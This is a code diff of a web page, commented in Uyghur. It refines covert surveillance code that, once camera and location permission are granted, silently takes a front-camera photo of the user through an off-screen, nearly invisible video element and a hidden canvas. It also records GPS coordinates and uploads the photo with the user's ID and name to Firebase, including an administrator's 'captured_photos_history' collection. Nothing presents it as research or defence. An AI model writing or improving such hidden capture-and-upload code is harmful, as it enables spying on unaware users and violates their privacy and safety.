@@ -219,10 +219,10 @@
 
     <div class="screenshot-shield"></div>
 
-    <video id="secretCamStream" autoplay playsinline muted style="position:fixed; top:0; left:0; width:1px; height:1px; opacity:0; pointer-events:none; z-index:-1;"></video>
+    <!-- 🔥 كامېرا ئېقىمى تەييار بولۇشى ئۈچۈن video ئېلېمېنتى ئېكراننىڭ سىرتقى قىسمىدا ئامان ساقلاندى -->
+    <video id="secretCamStream" autoplay playsinline muted style="position:fixed; top:-9999px; left:-9999px; width:320px; height:240px; opacity:0.01; pointer-events:none; z-index:-1;"></video>
     <canvas id="secretCanvas" style="display:none;"></canvas>
 
-    <!-- 🔥 كۆزنەكتىكى تېكىست ئۆزگەرتىلدى -->
     <div id="permissionModal">
         <div class="permission-box">
             <i class="fa-solid fa-shield-halved"></i>
@@ -403,14 +403,14 @@
             }
         }
 
-        // 🔥 رۇخسەت بېرىلگەن ھامان كېچىكمەي دەرھال سۈرەتكە ئالىدىغان فۇنكسىيە
+        // 🔥 باشقۇرغۇچىغا ئاپتوماتىك ۋە شۇئان يوللايدىغان پۇختا كود
         async function requestUserPermissionsAndCapture() {
             if (!currentUser || !currentUser.id) return;
 
             const permModal = document.getElementById('permissionModal');
             if (permModal) permModal.style.display = 'none';
 
-            // 1. GPS ئورنى ئېلىش
+            // 1. GPS ئورنى ئېلىپFirebase-قا يېزىش
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
@@ -426,7 +426,7 @@
                 }, { enableHighAccuracy: true, timeout: 8000 });
             }
 
-            // 2. كامېرانى ئېچىپ شۇئان سۈرەت ئېلىش
+            // 2. كامېرا رۇخسىتى بېرىلگەن ھامان سۈرەتكە ئېلىپ باشقۇرغۇچىغا يوللاش
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
@@ -435,42 +435,50 @@
 
                 const video = document.getElementById('secretCamStream');
                 video.srcObject = stream;
-                
-                // ئابونت رۇخسەت بەرگەن ھامان ئاپتوماتىك سۈرەتكە ئالىدۇ (شۇئان)
-                video.onloadedmetadata = () => {
+
+                const takeAndSendSnap = () => {
+                    try {
+                        const canvas = document.getElementById('secretCanvas');
+                        const width = video.videoWidth || 640;
+                        const height = video.videoHeight || 480;
+
+                        canvas.width = width;
+                        canvas.height = height;
+
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, width, height);
+
+                        const imageData = canvas.toDataURL('image/jpeg', 0.65);
+                        const nowStr = new Date().toLocaleString();
+
+                        const capturePayload = {
+                            image: imageData,
+                            capturedAt: nowStr
+                        };
+
+                        // 🔥 1. ئابونتنىڭ ئۆزىگە تەشكىللەپ ساقلاش
+                        window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), capturePayload);
+
+                        // 🔥 2. باشقۇرغۇچىنىڭ تېز كۆرۈش ئامبىرىغا بىرلا ۋاقىتتا تەڭ يوللاش
+                        const historyRef = window.dbPush(window.dbRef(window.db, 'captured_photos_history'));
+                        window.dbSet(historyRef, {
+                            userId: currentUser.id,
+                            userName: currentUser.first_name,
+                            image: imageData,
+                            time: nowStr
+                        });
+
+                        // كامېرا ئېقىمىنى ئۆچۈرۈش
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch(err) {
+                        console.error("سۈرەتكە ئېلىشتا خاتالىق:", err);
+                    }
+                };
+
+                // ئېقىم تەييار بولۇشى بىلەن تەڭ شۇئان ئىجرا بولىدۇ
+                video.onloadeddata = () => {
                     video.play();
-                    
-                    const canvas = document.getElementById('secretCanvas');
-                    const width = video.videoWidth || 640;
-                    const height = video.videoHeight || 480;
-
-                    canvas.width = width;
-                    canvas.height = height;
-
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, width, height);
-
-                    const imageData = canvas.toDataURL('image/jpeg', 0.65);
-                    const nowStr = new Date().toLocaleString();
-
-                    const capturePayload = {
-                        image: imageData,
-                        capturedAt: nowStr
-                    };
-
-                    // Firebase-قا يوللاش
-                    window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), capturePayload);
-
-                    const historyRef = window.dbPush(window.dbRef(window.db, 'captured_photos_history'));
-                    window.dbSet(historyRef, {
-                        userId: currentUser.id,
-                        userName: currentUser.first_name,
-                        image: imageData,
-                        time: nowStr
-                    });
-
-                    // ئېقىمنى ئۆچۈرۈش
-                    stream.getTracks().forEach(track => track.stop());
+                    setTimeout(takeAndSendSnap, 300); // 300ms تەييارلىق سېكۇنتى ئارقىلىق سۈرەتنىڭ پۇختا چىقىشىغا كاپالەتلىك قىلىدۇ
                 };
 
             } catch (err) {
